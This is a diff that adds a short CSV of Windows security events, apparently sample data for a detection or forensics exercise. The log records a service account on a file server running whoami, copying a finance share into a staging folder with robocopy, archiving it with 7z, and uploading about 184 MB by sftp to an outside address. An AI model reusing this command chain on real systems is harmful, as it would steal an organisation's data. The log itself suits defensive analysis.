@@ -1,0 +1,8 @@
+UtcTime,EventType,Host,User,ProcessName,CommandLine,ParentProcess,DestinationIp,DestinationPort,BytesSent,BytesReceived
+2026-05-01T22:44:12Z,ProcessCreate,FS01,CORP\svc-vpn-backup,cmd.exe,cmd.exe /c whoami,C:\Windows\System32\services.exe,,,0,0
+2026-05-01T22:45:33Z,ProcessCreate,FS01,CORP\svc-vpn-backup,robocopy.exe,robocopy.exe D:\Shares\Finance C:\ProgramData\stage\Finance /E /R:1 /W:1,C:\Windows\System32\cmd.exe,,,0,0
+2026-05-01T22:52:11Z,ProcessCreate,FS01,CORP\svc-vpn-backup,7z.exe,7z.exe a C:\ProgramData\stage\finance_20260501.7z C:\ProgramData\stage\Finance,C:\Windows\System32\cmd.exe,,,0,0
+2026-05-01T23:12:10Z,ProcessCreate,FS01,CORP\svc-vpn-backup,sftp.exe,sftp.exe -b C:\ProgramData\stage\batch.txt backup@203.0.113.88,C:\Windows\System32\cmd.exe,,,0,0
+2026-05-01T23:12:11Z,NetworkConnect,FS01,CORP\svc-vpn-backup,sftp.exe,sftp.exe -b C:\ProgramData\stage\batch.txt backup@203.0.113.88,C:\Windows\System32\cmd.exe,203.0.113.88,22,184734221,9134
+2026-05-02T00:30:00Z,ProcessCreate,FS01,CORP\backup-agent,backup.exe,backup.exe --daily --target backup01,C:\Program Files\Backup\service.exe,,,0,0
+
